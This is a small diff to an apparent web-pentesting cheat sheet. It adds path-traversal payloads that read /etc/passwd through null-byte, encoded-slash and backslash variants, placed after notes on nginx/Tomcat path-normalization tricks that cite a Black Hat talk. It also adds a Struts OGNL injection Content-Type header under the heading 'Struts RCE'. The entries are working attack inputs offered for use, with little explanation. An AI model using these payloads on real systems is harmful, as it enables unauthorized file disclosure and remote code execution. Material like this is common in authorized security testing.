@@ -18,7 +18,16 @@ https://www.videlibri.de/xidel.html
 ..;/ 
 or
 /foo;x=x/bar/
-tricks work well when you have a ngnix server in front of an tomcat
+above tricks work well when you have a ngnix server in front of an tomcat
+../../../../../../../../../../../../etc/passwd%00
+//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
+
 
 References:- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+```
+
+**Struts RCE**
+```
+Content-Type: ${#context["com.opensymphone.xwork2.dispatcher.HttpServletResponse"].addHeader("Struts-RCE",191*7)}.multipart/form-data
 ```
